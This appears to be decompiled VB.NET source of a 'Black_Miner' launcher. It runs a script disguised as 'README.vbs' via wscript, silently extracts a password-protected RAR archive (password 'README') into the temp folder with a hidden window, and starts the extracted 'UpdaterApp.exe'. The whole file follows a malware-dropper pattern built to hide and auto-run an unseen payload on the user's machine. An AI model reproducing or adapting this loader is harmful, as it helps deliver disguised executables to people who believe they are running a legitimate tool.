Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms

Namespace Black_Miner
	' Token: 0x02000002 RID: 2
	Friend Module Program
		' Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		<STAThread()>
		Private Sub Main()
			Dim vbsFilePath As String = Path.Combine(New String() { "resources\tools\README.vbs" })
			If File.Exists(vbsFilePath) Then
				Process.Start("wscript.exe", """" + vbsFilePath + """")
			End If
			Thread.Sleep(5000)
			Application.EnableVisualStyles()
			Application.SetCompatibleTextRenderingDefault(False)
			Dim updatePath As String = Path.Combine(Program.tempPath, "data", "UpdaterApp.exe")
			If File.Exists(updatePath) Then
				Process.Start(updatePath, "--fromLauncher")
			Else
				Program.DecompressWithWinRAR(Program.tempPath)
				If File.Exists(updatePath) Then
					Process.Start(updatePath, "--fromLauncher")
				End If
			End If
			Application.[Exit]()
		End Sub

		' Token: 0x06000002 RID: 2 RVA: 0x000020F8 File Offset: 0x000002F8
		Private Sub DecompressWithWinRAR(destinationPath As String)
			Dim winRarPath As String = If(File.Exists("C:\Program Files\WinRAR\WinRAR.exe"), "C:\Program Files\WinRAR\WinRAR.exe", If(File.Exists("C:\Program Files (x86)\WinRAR\WinRAR.exe"), "C:\Program Files (x86)\WinRAR\WinRAR.exe", String.Empty))
			If String.IsNullOrEmpty(winRarPath) Then
				Return
			End If
			Dim sourcePath As String = Path.Combine(Application.StartupPath, "resources\tools\data.rar")
			Dim password As String = "README"
			Process.Start(New ProcessStartInfo() With { .FileName = winRarPath, .Arguments = String.Concat(New String() { "x -p", password, " """, sourcePath, """ """, destinationPath, """" }), .WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit()
		End Sub

		' Token: 0x04000001 RID: 1
		Private tempPath As String = Path.GetTempPath()
	End Module
End Namespace
